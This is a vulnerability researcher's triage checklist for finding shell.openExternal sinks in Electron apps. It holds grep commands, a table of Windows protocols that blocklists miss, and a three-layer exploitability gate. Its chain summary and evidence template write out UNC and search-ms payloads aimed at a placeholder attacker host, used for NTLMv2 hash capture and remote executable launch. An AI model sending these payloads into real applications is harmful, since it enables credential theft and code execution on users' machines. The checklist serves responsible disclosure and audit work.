---
type: reference
category: Checklist
tags: [checklist, electron, shell.openExternal, static-analysis, triage, windows, unc, smb, ntlm, batch-audit]
last_updated: 2026-06-04
source: prior session items and lessons + Pattern - shell.openExternal UNC RCE
---

# Checklist — Electron shell.openExternal Static Analysis Triage

> **Purpose**: Prevent wasted hunts (see lessons) and enforce consistent evidence standards before opening any Finding.
>
> **Scope**: Static analysis triage only. For dynamic verification SOP see [[Pattern - shell.openExternal UNC RCE]] § Live verification SOP.
>
> **Time budget**: Pre-analysis gates 5 min / Sink discovery 10 min / Per-site analysis 5 min / Delivery chain gate 10 min — total ~30 min for one app.

---

## Pre-analysis gates (Do first; any FAIL = immediate stop-loss)

- [ ] **Confirm Electron**: `app.asar` present, `electron` in `package.json` devDependencies, bundled Chromium dir (`resources/`, `locales/`, `LICENSE.electron.txt` or `LICENSE.chromium.html`), binary size ~100-200 MB. If none of these → not Electron → stop.
- [ ] **CVE / advisory pre-check** for `shell.openExternal` in this specific app:
  - Search NVD: `site:nvd.nist.gov "openExternal" <appname>`
  - Search GitHub: `<org>/<repo>` releases + security advisories tab
  - Check whether fix is already in shipping version. If patched in current version → **stop** (no new finding; reference CVE in KB only).
  - Known patched examples: some desktop messengers have already fixed openExternal issues (e.g., CVE-2020-15258, CVE-2024-37182 with a BLOCKED_PROTOCOLS list) — confirm whether the fix is in the shipping version and check for gaps before reopening.
- [ ] **Binary / source obtainable**: installer or asar downloadable without account or payment. Closed-source with no binary → black-box only, static analysis not applicable → stop or flag as black-box target.
- [ ] **Extract asar**:
  ```bash
  npx asar extract app.asar /tmp/<appname>_extracted
  ```
  If asar is encrypted or not present → stop static analysis path.

---

## Sink discovery (first step after extraction)

Run all four greps before reading any result — avoid tunnel vision on first hit.

```bash
APP=/tmp/<appname>_extracted

# Primary sink
grep -rn "shell\.openExternal\|shell\.openPath\|shell\.showItemInFolder" "$APP" --include="*.js" -l

# new-window / will-navigate handlers (secondary sink — often calls openExternal internally)
grep -rn "new-window\|will-navigate\|setWindowOpenHandler\|openExternalForce" "$APP" --include="*.js" -l

# External helper modules that may wrap openExternal
grep -rn "openExternalUrl\|openExternalLink\|openLink\|openUrl" "$APP" --include="*.js" -l

# skipValidityCheck / ALLOWED_PROTOCOLS (Ferdium/Franz pattern — validation in wrapper, not at sink)
grep -rn "skipValidityCheck\|ALLOWED_PROTOCOLS\|BLOCKED_PROTOCOLS\|allowedProtocols\|blockedProtocols" "$APP" --include="*.js" -l
```

- [ ] All four greps run and output recorded.
- [ ] Helper module identified if wrapper pattern present. Read wrapper definition before judging sink — validation may be in wrapper, not in call site (Franz pattern: `ALLOWED_PROTOCOLS` only applies to `setWindowOpenHandler`, not to `serviceContextMenu → openExternalUrl`).

---

## For each call site (go through each sink one by one)

For each file from sink discovery:

- [ ] **Is URL validation present at this call site?**
  - `new URL(url)` parse + protocol check → allowlist or blocklist?
  - If allowlist (`SAFE_PROTOCOLS = ["https:", "mailto:"]`, deny-by-default): **SAFE** — skip this site.
  - If blocklist: proceed to blocklist gap analysis below.
  - If zero validation: **FINDING candidate** — proceed to delivery chain gate.

- [ ] **Blocklist gap analysis** (only if blocklist present):
  Dangerous Windows protocols that blocklists commonly miss:

  | Protocol | Effect | Often missed? |
  |----------|--------|--------------|
  | `search-ms:` | 0-dialog NTLMv2 capture | Yes |
  | `smb://` | 1-dialog NTLMv2 capture | Yes (common blocklist gap) |
  | `ftp:` | FTP connection | Yes |
  | `ldap:` / `ldaps:` | LDAP auth leak | Yes |
  | `ms-msdt:` | Follina RCE (patched Win11) | Moot but check blocklist hygiene |
  | `ms-officecmd:` | Office exec | Situational |
  | `ms-settings:` | UAC bypass chain | Situational |
  | `file:` | Local file open | Sometimes present |
  | `telnet:` / `ssh:` | Protocol handlers | Rare |
  | `\\` / `//` UNC prefix | ShellExecuteEx PE exec | Often absent from string-match blocklists |

  - [ ] `smb:` / `smb://` explicitly blocked?
  - [ ] `search-ms:` explicitly blocked?
  - [ ] UNC prefix `\\` rejected (string prefix check or `new URL()` throws TypeError)?
  - [ ] `ftp:` / `ldap:` blocked?
  - If any gap: document which protocol is not blocked → proceed to delivery chain gate for that gap.

- [ ] **All call sites covered?**
  - main process handlers
  - popup window handlers (`BrowserWindow` spawned for calls/notifications)
  - plugin popup or webview handlers
  - `new-window` / `setWindowOpenHandler` fallthrough path
  - Check: does `skipValidityCheck=true` (or equivalent flag) bypass the allowlist/blocklist? (Ferdium vulnerability: `buildMenuForLink` passes `skipValidityCheck=true` → bypasses `ALLOWED_PROTOCOLS`.)

- [ ] **Does the catch block allow or deny fallthrough?**
  ```javascript
  // ❌ bad: catch silently falls through to openExternal
  try { u = new URL(url); } catch { shell.openExternal(url); }

  // ✅ good: catch returns / rejects
  try { u = new URL(url); } catch { return; }
  ```
  If catch falls through to sink → validation is bypassable with malformed URL → document.

---

## Delivery chain gate (every candidate sink must pass, before opening a Finding)

Three layers must all pass for the finding to be exploitable. Document each layer explicitly in the Finding.

```
Layer 1 (Input): Attacker can inject non-http scheme at an input point
Layer 2 (Transit): No middle-layer sanitization strips the scheme before reaching sink
Layer 3 (Sink): Scheme reaches the confirmed shell.openExternal call
Exploitable = L1 × L2 × L3 (all three must be YES)
```

- [ ] **Layer 1 — Input point identified**:
  - IPC handler receives URL from renderer (via `ipcRenderer.send` / `ipcMain.on`)?
  - Notification payload from server contains URL?
  - Link click in embedded webview/webContent (HTML `<a href>`, `window.open`)?
  - Custom scheme handler receives URL from external source?
  - Document the exact input point and whether attacker can control the URL value.

- [ ] **Layer 2 — Middle-layer sanitization absent**:
  - Does the renderer or IPC bridge sanitize before passing to main?
  - Does `senderFrame.url` validation restrict which renderer can trigger the IPC? (If yes and attacker cannot control a trusted renderer origin → L2 blocks.)
  - Does a message bus / SignalR / WebSocket server strip non-http schemes server-side?
  - If any middle-layer strips the scheme → L2 FAIL → not exploitable via this path.

- [ ] **Layer 3 — Scheme reaches sink**:
  Confirmed by reading the code path from input to `shell.openExternal(url)` call. Must be traceable without dynamic execution.

- [ ] **Chain summary written** (one sentence):
  > "Attacker sends `\\attacker\share\poc.exe` as URL in `<input_point>` → passes through `<handler>` with zero validation → reaches `shell.openExternal` at `<file>:<line>`."

---

## Kill conditions (any one true → do not open a Finding)

- [ ] Cannot demonstrate attacker-controlled URL reaching the sink (L1, L2, or L3 fails)
- [ ] Finding requires 5+ simultaneous prerequisites with no realistic attack scenario
- [ ] Sink confirmed but zero user-reachable attack path exists (e.g., handler only reachable from localhost with prior auth, no XSS/scheme-injection to trigger it)
- [ ] App already has deny-by-default allowlist covering **all** call sites (including popup, webview, and fallthrough paths)
- [ ] Already patched in the shipping version you are analyzing (check CVE/advisory — stop, do not re-report)
- [ ] `new URL(url)` parse is used AND UNC paths (`\\`) are rejected AND scheme is allowlist-only — all three conditions simultaneously → SAFE

---

## Evidence record (open Finding only if all delivery chain gates pass)

Minimum required before opening Finding:

```
audit_ref: [audit:static]          # static-only = Grade B
file: <path/to/file.js>
line: <line number>
sink: shell.openExternal(url)
input_point: <describe L1>
validation: none / blocklist-with-gap (<protocol> missing) / catch-fallthrough
layer_1: <attacker input mechanism>
layer_2: no middle-layer sanitization confirmed at <handler>
layer_3: url flows directly to sink at <file:line>
payload_candidate: \\<attacker-ip>\SHARE\poc.exe OR search-ms:query=X&crumb=location:\\<IP>\SHARE
impact_framing: "1-click NTLMv2 hash exfiltration + 1-click remote code execution via Windows security dialog (UI:R)" [NOT "0-click RCE"]
verified_evidence: static
```

If `verified_evidence: static` → grade B → acceptable for HITCON ZD / TWCERT submission with explicit static notation. For HackerOne P1 bounty programs → dynamic verification recommended first.

---

## Related

- [[Pattern - shell.openExternal UNC RCE]] — pattern detail, live SOP, variant table, CVSS framing
- [[Pattern - Windows UNC Path Primitive]] — OS-level primitive shared by T1/T2/T3/T4 sinks
- [[Pattern - Electron Custom Scheme Handler Injection]] — common L1 input point
- [[Pattern - Electron Preload Injection Chain]] — common L1 input point
- [[Checklist - Web Vuln Technique Coverage]] — technique matrix for web-facing injection paths into Electron
- [[Lessons Learned]] — three-layer filtering model; batch audit ROI; CVE incomplete fix; asar rapid grading method
